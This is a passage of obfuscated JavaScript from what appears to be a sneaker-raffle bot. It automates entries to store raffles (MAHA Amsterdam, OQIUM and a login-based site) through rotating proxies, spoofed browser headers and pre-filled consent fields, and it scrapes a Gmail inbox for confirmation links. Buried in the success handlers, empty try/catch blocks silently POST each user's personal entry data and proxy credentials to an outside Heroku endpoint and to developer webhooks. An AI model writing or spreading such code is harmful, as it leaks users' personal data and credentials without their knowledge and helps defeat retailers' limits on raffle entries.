                                _0x31839f['resourceType']() === 'image' || _0x31839f['resourceType']() === 'font' || _0x31839f['resourceType']() === 'media' ? _0x31839f['abort']() : _0x31839f['continue']();
                            }), await _0x298506['goto']('' + _0x576f9a[_0xe10db5]['Url'], { 'waitUntil': 'networkidle2' }), await _0x1d2efb(0x12c), await _0x298506['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x298506['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1d2efb(0x7d0);
                            try {
                                await _0x298506['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x298506['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x298506['waitForSelector']('#username'), await _0x298506['type']('#username', _0x576f9a[_0xe10db5]['Email']), await _0x298506['waitForSelector']('#password'), await _0x298506['type']('#password', _0x576f9a[_0xe10db5]['Password']), await _0x1d2efb(0x190), await _0x298506['click']('#buttonSubmit'), await _0x298506['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x576f9a[_0xe10db5]['Size']);
                            let _0x3dd345 = _0x576f9a[_0xe10db5]['Size']['replace']('.5', '\x201/2');
                            if (_0x3dd345['toUpperCase']() == 'RANDOM') {
                                const _0x5d26d2 = await _0x298506['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x27cb48 = Math['round'](Math['random']() * (_0x5d26d2['length'] - 0x1));
                                await _0x5d26d2[_0x27cb48]['click']();
                            } else
                                await _0x298506['click']('button[aria-label=\x22' + _0x3dd345 + '\x22]');
                            await _0x1d2efb(0x1f4);
                            try {
                                await _0x298506['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x1d2efb(0x12c), console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x298506['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_addressFields_firstName', _0x576f9a[_0xe10db5]['FirstName']), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_addressFields_lastName', _0x576f9a[_0xe10db5]['LastName']), await _0x1d2efb(0x12c), await _0x298506['select']('#dwfrm_raffle_addressFields_country', _0x576f9a[_0xe10db5]['Country']), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_addressFields_city', _0x576f9a[_0xe10db5]['City']), await _0x1d2efb(0x12c);
                            _0x576f9a[_0xe10db5]['Postcode'] == undefined && (_0x576f9a[_0xe10db5]['Postcode'] = _0x576f9a[_0xe10db5]['Zip']);
                            await _0x298506['type']('#dwfrm_raffle_addressFields_postalCode', _0x576f9a[_0xe10db5]['Postcode']), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_addressFields_address1', _0x576f9a[_0xe10db5]['Address1']), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_addressFields_address2', _0x576f9a[_0xe10db5]['HouseNumber']), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x576f9a[_0xe10db5]['Address2']), await _0x1d2efb(0x12c), await _0x298506['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x1d2efb(0x12c), await _0x298506['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x576f9a[_0xe10db5]['Follower']), await _0x1d2efb(0x1f4), await _0x298506['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20' + _0x1b5f76['blue']('Awaiting\x20Paypal\x20Payment')), await _0x298506['click']('.b-paypal_button');
                            try {
                                await _0x298506['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x5e10cd = 'no', _0x21396e(_0x576f9a[_0xe10db5], _0x16841a), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x38bd1b['succesDEVMSG']);
                                await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x38bd1b['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x38bd1b['succesPUBMSG']);
                                let _0x3eee19 = _0x576f9a[_0xe10db5];
                                try {
                                    prxdata = {
                                        'username': _0x3919f0['replace']('#', ''),
                                        'module': _0x16841a['name'],
                                        'entrydata': JSON['stringify'](_0x3eee19),
                                        'proxy': '' + _0x5f12aa[_0xe10db5]
                                    };
                                    var _0x3403f3 = JSON['stringify'](prxdata);
                                    let _0x3113a2 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x3403f3, _0x3113a2);
                                } catch (_0x5a11cf) {
                                }
                            } catch (_0x23aba3) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x23aba3)), _0x288ecd = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x23aba3;
                                var _0x36c57f = await _0x3aa619(_0x576f9a[_0xe10db5], _0x16841a, 'dev', !![], _0x288ecd);
                                _0x38bd1b['errorDEV'] = { 'embeds': [_0x36c57f] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x38bd1b['errorDEV']), await _0x471d59(_0x32fdb9, _0x38bd1b['errorDEV']);
                            }
                        } catch (_0x937757) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20' + _0x937757)), _0x288ecd = '' + _0x937757;
                            var _0x36c57f = await _0x3aa619(_0x576f9a[_0xe10db5], _0x16841a, 'dev', !![], _0x288ecd);
                            _0x38bd1b['errorDEV'] = { 'embeds': [_0x36c57f] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x38bd1b['errorDEV']), await _0x471d59(_0x32fdb9, _0x38bd1b['errorDEV']), _0x5e10cd = 'yes';
                        } finally {
                            _0x9aef6f && _0x9aef6f['close']();
                            if (_0x5e10cd == 'yes' && _0xb7f62f != 0x5) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Retrying\x20(' + _0xb7f62f + '\x20/\x205)')), _0xe10db5 = _0xe10db5 - 0x1, _0xb7f62f = _0xb7f62f + 0x1;
                                continue;
                            }
                            _0x5e10cd == 'yes' && _0xb7f62f >= 0x5 && (_0x12ac99(_0x576f9a[_0xe10db5], _0x16841a), _0x5e10cd = 'no', _0xb7f62f = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['AfewDelay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x20f799, _0x1f3749, _0x134eb7) {
                    for (var _0x1052c0 = 0x0; _0x1052c0 < _0x1f3749['length']; _0x1052c0++) {
                        try {
                            await _0x3cf8c0(_0x1f3749, _0x1052c0);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1cb4ce(_0x3df2c5, _0xa9027b, _0xf4fdd2, _0x29cd48, _0x49c5c9) {
                            var _0x3b59d3, _0x38a7ff = {}, _0xd867e9 = [], _0x4298ef = {}, _0x5f2a15 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x311b5a = Math['round'](Math['random']() * (_0x5f2a15['length'] - 0x1));
                            !_0x29cd48 && (_0x29cd48 = {});
                            if (_0xa9027b != 'ver') {
                                _0xd208b3(_0xf4fdd2['name'] + '\x20Task\x20' + (_0x3df2c5 + 0x1) + '\x20/\x20' + _0x29cd48['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d), await _0x3cf8c0(_0x29cd48, _0x3df2c5), _0x38a7ff = _0xf4fdd2['data'], _0x38a7ff['data']['attributes']['email'] = '' + _0x29cd48[_0x3df2c5]['Email'];
                                if (_0x29cd48[_0x3df2c5]['Size'] == 'RANDOM') {
                                }
                                _0x38a7ff['data']['attributes']['properties']['$first_name'] = '' + _0x29cd48[_0x3df2c5]['FirstName'], _0x38a7ff['data']['attributes']['properties']['$last_name'] = '' + _0x29cd48[_0x3df2c5]['LastName'], _0x38a7ff['data']['attributes']['properties']['$address1'] = _0x29cd48[_0x3df2c5]['Address1'] + '\x20' + _0x29cd48[_0x3df2c5]['Address2'] + '\x20' + _0x29cd48[_0x3df2c5]['HouseNumber'], _0x38a7ff['data']['attributes']['properties']['$zip'] = '' + _0x29cd48[_0x3df2c5]['Zip'], _0x38a7ff['data']['attributes']['properties']['$city'] = '' + _0x29cd48[_0x3df2c5]['City'], _0x38a7ff['data']['attributes']['properties']['$country'] = '' + _0x29cd48[_0x3df2c5]['Country'], _0x29cd48[_0x3df2c5]['Size'] == 'RANDOM' ? _0x38a7ff['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5f2a15[_0x311b5a] : _0x38a7ff['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x29cd48[_0x3df2c5]['Size'], _0x38a7ff['data']['attributes']['properties']['$phone_number'] = '' + _0x29cd48[_0x3df2c5]['Phone'], _0x38a7ff['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x29cd48[_0x3df2c5]['Follower'];
                            }
                            if (_0x6a12f3['useRandomProxy'] = ![])
                                var _0xdaa7a7 = _0x49c5c9[_0x3df2c5]['split'](':');
                            else
                                var _0xf2e9f6 = Math['round'](Math['random']() * (_0x49c5c9['length'] - 0x1)), _0xdaa7a7 = _0x49c5c9[_0xf2e9f6]['split'](':');
                            var _0xed1029 = {
                                'jar': _0x4054b9,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0xf4fdd2['url'],
                                'headers': _0xf4fdd2['headers'],
                                'body': JSON['stringify'](_0x38a7ff),
                                'proxy': 'http://' + _0xdaa7a7[0x2] + ':' + _0xdaa7a7[0x3] + '@' + _0xdaa7a7[0x0] + ':' + _0xdaa7a7[0x1]
                            };
                            return _0xa9027b != 'ver' && (_0xed1029['url'] = _0xf4fdd2['url'], _0xed1029['headers'] = _0xf4fdd2['headers']), _0xa9027b == 'ver' && (_0xed1029['method'] = 'GET'), new Promise(function (_0x2a379a, _0x21f9af) {
                                callback = async (_0x19f0fb, _0x15e18e, _0x52370e) => {
                                    if (!_0x19f0fb && _0x15e18e['statusCode'] == 0xca || !_0x19f0fb && _0x15e18e['statusCode'] == 0xc8) {
                                        if (_0xa9027b != 'ver') {
                                            var _0x2d53f4 = await _0x3aa619(_0x29cd48[_0x3df2c5], _0xf4fdd2, 'dev', ![]), _0x1d5c2e = await _0x3aa619(_0x29cd48[_0x3df2c5], _0xf4fdd2, 'pub', ![]);
                                            const _0x3000ed = {
                                                'succesDEVMSG': { 'embeds': [_0x2d53f4] },
                                                'succesPUBMSG': { 'embeds': [_0x1d5c2e] }
                                            };
                                            let _0x2bf745 = _0x29cd48[_0x3df2c5];
                                            try {
                                                prxdata = {
                                                    'username': _0x3919f0['replace']('#', ''),
                                                    'module': _0xf4fdd2['name'],
                                                    'entrydata': JSON['stringify'](_0x2bf745),
                                                    'proxy': '' + _0x49c5c9[_0x3df2c5]
                                                };
                                                var _0x28b7ab = JSON['stringify'](prxdata);
                                                let _0x1f656a = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x28b7ab, _0x1f656a);
                                            } catch (_0x4280c5) {
                                            }
                                            if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                                try {
                                                    await _0x471d59(_0x6a12f3['webhook'], _0x3000ed['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x3000ed['succesDEVMSG']), await _0x1d2efb(0xc8);
                                            try {
                                                await _0x471d59(_0x1d6d5c, _0x3000ed['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x21396e(_0x29cd48[_0x3df2c5], _0xf4fdd2);
                                        }
                                        _0x2a379a(console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0xf4fdd2['name'] + ']\x20Task\x20' + (_0x3df2c5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xa9027b != 'ver') {
                                            var _0x1d7498 = '' + _0x19f0fb, _0x106f61 = await _0x3aa619(_0x29cd48[_0x3df2c5], _0xf4fdd2, 'dev', !![], _0x1d7498), _0x32fe6b = {};
                                            _0x32fe6b['errorDEV'] = { 'embeds': [_0x106f61] }, _0x12ac99(_0x29cd48[_0x3df2c5], _0xf4fdd2), _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x32fe6b['errorDEV']), await _0x471d59(_0x32fdb9, _0x32fe6b['errorDEV']);
                                        }
                                        _0x21f9af(console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xf4fdd2['name'] + ']\x20Task\x20' + (_0x3df2c5 + 0x1) + ':\x20' + _0x19f0fb)));
                                    }
                                };
                                try {
                                    _0xa9027b != 'ver' && console['log'](_0x24cf02() + '\x20[' + _0xf4fdd2['name'] + ']\x20Task\x20' + (_0x3df2c5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x38a7ff['data']['attributes']['email']), _0x173581(_0xed1029, callback);
                                } catch (_0x283260) {
                                    console['log'](_0x24cf02() + '\x20Task\x20' + (_0x3df2c5 + 0x1) + ':\x20' + _0x283260);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1cb4ce(_0x1052c0, 'nor', _0x20f799, _0x1f3749, _0x134eb7), console['log'](_0x24cf02() + '\x20[' + _0x20f799['name'] + ']\x20Sleeping\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        } catch (_0x11818d) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4c114e, _0x18ac97, _0x2aa029) {
                    var _0x5523a3 = [], _0x56c98b = ![];
                    async function _0x1bb37b() {
                        var _0x579287 = new _0x2fec54({
                            'user': _0x6a12f3['masterMail'],
                            'password': _0x6a12f3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xe49108(_0x1d0cc2) {
                            _0x579287['openBox']('INBOX', ![], _0x1d0cc2);
                        }
                        _0x579287['once']('ready', function () {
                            _0xe49108(function (_0xd6a344, _0x1786a8) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xd6a344)
                                    throw _0xd6a344;
                                _0x579287['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x514e87, _0x2751cf) {
                                    if (!_0x2751cf || !_0x2751cf['length'])
                                        console['log'](_0x24cf02() + '\x20[' + _0x4c114e['name'] + ']\x20No\x20mails\x20found'), _0x579287['end']();
                                    else {
                                        var _0x46723e = _0x579287['seq']['fetch'](_0x2751cf, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x46723e['on']('message', function (_0x1ace31, _0x17d425) {
                                            var _0x111197 = '(#' + _0x17d425 + ')\x20';
                                            _0x1ace31['on']('body', function (_0x464b9a, _0x7e2a79) {
                                                _0xe064d3(_0x464b9a, (_0x58a24a, _0x2c015e) => {
                                                    var _0x17a3db = _0x2c015e['text']['split']('(')[0x1], _0x574879 = _0x17a3db['split'](')')[0x0];
                                                    _0x5523a3['push'](_0x574879);
                                                });
                                            }), _0x1ace31['once']('end', function () {
                                            });
                                        }), _0x46723e['once']('error', function (_0x2de2d3) {
                                            console['log']('Fetch\x20error:\x20' + _0x2de2d3), _0x56c98b = !![];
                                        }), _0x46723e['once']('end', function () {
                                            _0x579287['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x579287['once']('error', function (_0x3de2d3) {
                            console['log'](_0x1b5f76['red'](_0x3de2d3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x56c98b = !![];
                        }), _0x579287['once']('end', async function () {
                            _0x56c98b = !![];
                        }), _0x579287['connect']();
                    }
                    async function _0x283fcf(_0x13b4cd, _0x3f1910, _0x5edbe2) {
                        for (var _0x545a83 = 0x0; _0x545a83 < _0x3f1910['length']; _0x545a83++) {
                            async function _0x593505(_0x15f287, _0x271d82, _0x1a6afb, _0xfaade, _0x18e949) {
                                var _0x3d0da4, _0x2ff679 = {}, _0x5ee58e = [], _0x4b2221 = {}, _0x297c95 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1c504a = Math['round'](Math['random']() * (_0x297c95['length'] - 0x1));
                                _0xfaade[_0x15f287]['Size'] == 'RANDOM' && (_0xfaade[_0x15f287]['Size'] = _0x297c95[_0x1c504a]);
                                !_0xfaade && (_0xfaade = {});
                                if (_0x6a12f3['useRandomProxy'] = ![])
                                    var _0x3345dc = _0x18e949[_0x15f287]['split'](':');
                                else
                                    var _0x160438 = Math['round'](Math['random']() * (_0x18e949['length'] - 0x1)), _0x3345dc = _0x18e949[_0x160438]['split'](':');
                                var _0x4bb0ff = {
                                    'jar': _0x4054b9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1a6afb['url'],
                                    'headers': _0x1a6afb['headers'],
                                    'body': JSON['stringify'](_0x2ff679),
                                    'proxy': 'http://' + _0x3345dc[0x2] + ':' + _0x3345dc[0x3] + '@' + _0x3345dc[0x0] + ':' + _0x3345dc[0x1]
                                };
                                return _0x271d82 != 'ver' && (_0x4bb0ff['url'] = _0x1a6afb['url'], _0x4bb0ff['headers'] = _0x1a6afb['headers']), _0x271d82 == 'ver' && (_0x4bb0ff['method'] = 'GET', _0x4bb0ff['url'] = _0xfaade[_0x15f287]), new Promise(function (_0x34f82c, _0x20685c) {
                                    callback = async (_0x41a26f, _0x3446d8, _0xd3da93) => {
                                        if (!_0x41a26f && _0x3446d8['statusCode'] == 0xca || !_0x41a26f && _0x3446d8['statusCode'] == 0xc8) {
                                            if (_0x271d82 != 'ver') {
                                                var _0x58769c = await _0x3aa619(_0xfaade[_0x15f287], _0x1a6afb, 'dev', ![]), _0x47256d = await _0x3aa619(_0xfaade[_0x15f287], _0x1a6afb, 'pub', ![]);
                                                const _0x339953 = {
                                                    'succesDEVMSG': { 'embeds': [_0x58769c] },
                                                    'succesPUBMSG': { 'embeds': [_0x47256d] }
                                                };
                                                if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                                    try {
                                                        await _0x471d59(_0x6a12f3['webhook'], _0x339953['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x339953['succesDEVMSG']), await _0x1d2efb(0xc8);
                                                try {
                                                    await _0x471d59(_0x1d6d5c, _0x339953['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x21396e(_0xfaade[_0x15f287], _0x1a6afb);
                                            }
                                            _0x34f82c(console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x1a6afb['name'] + ']\x20Task\x20' + (_0x15f287 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x271d82 != 'ver') {
                                                var _0xb512ae = '' + _0x41a26f, _0x158bd5 = await _0x3aa619(_0xfaade[_0x15f287], _0x1a6afb, 'dev', !![], _0xb512ae), _0x4f6288 = {};
                                                _0x4f6288['errorDEV'] = { 'embeds': [_0x158bd5] }, _0x12ac99(_0xfaade[_0x15f287], _0x1a6afb), _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x4f6288['errorDEV']), await _0x471d59(_0x32fdb9, _0x4f6288['errorDEV']);
                                            }
                                            _0x20685c(console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x1a6afb['name'] + ']\x20Task\x20' + (_0x15f287 + 0x1) + ':\x20' + _0x41a26f)));
                                        }
                                    };
                                    try {
                                        _0x271d82 != 'ver' ? console['log'](_0x24cf02() + '\x20[' + _0x1a6afb['name'] + ']\x20Task\x20' + (_0x15f287 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2ff679['data']['attributes']['email']) : console['log'](_0x24cf02() + '\x20[' + _0x1a6afb['name'] + ']\x20Task\x20' + (_0x15f287 + 0x1) + ':\x20Fetching\x20Response'), _0x173581(_0x4bb0ff, callback);
                                    } catch (_0x18d6bc) {
                                        console['log'](_0x24cf02() + '\x20Task\x20' + (_0x15f287 + 0x1) + ':\x20' + _0x18d6bc);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x593505(_0x545a83, 'ver', _0x13b4cd, _0x3f1910, _0x5edbe2), console['log'](_0x24cf02() + '\x20[' + _0x13b4cd['name'] + ']\x20Sleeping\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                            } catch (_0x36582a) {
                            }
                        }
                    }
                    try {
                        _0x1bb37b();
                        while (!_0x56c98b) {
                            await _0x1d2efb(0xbb8);
                        }
                        console['log']('Found\x20' + _0x5523a3['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1d2efb(0x9c4);
                    }
                    await _0x283fcf(_0x4c114e, _0x5523a3, _0x2aa029);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x517110, _0x4436e1, _0x12e883) {
                    var _0xc77b92 = _0x4436e1, _0x49f9ee = 0x0;
                    for (var _0x186df3 = 0x0; _0x186df3 < _0x4436e1['length']; _0x186df3++) {
                        maxTasks = _0x6a12f3['threads'];
                        while (_0x49f9ee >= maxTasks) {
                            await _0x1d2efb(_0x6a12f3['delay']);
                        }
                        async function _0x2c2acb(_0x3242f9, _0x1f3616, _0x117aa4, _0x51afad) {
                            try {
                                await _0x3cf8c0(_0x1f3616, _0x51afad);
                            } catch (_0x261031) {
                                throw new Error(_0x261031);
                            }
                            async function _0x33671e(_0x5315f8, _0x366562, _0x58f83d, _0x4a7537, _0xdf47c) {
                                _0x49f9ee++;
                                var _0x349bd1, _0x361a8b = {}, _0x2ab8b7 = [], _0x4e8a86 = {}, _0x165338 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x2b81ea = Math['round'](Math['random']() * (_0x165338['length'] - 0x1));
                                !_0x4a7537 && (_0x4a7537 = {});
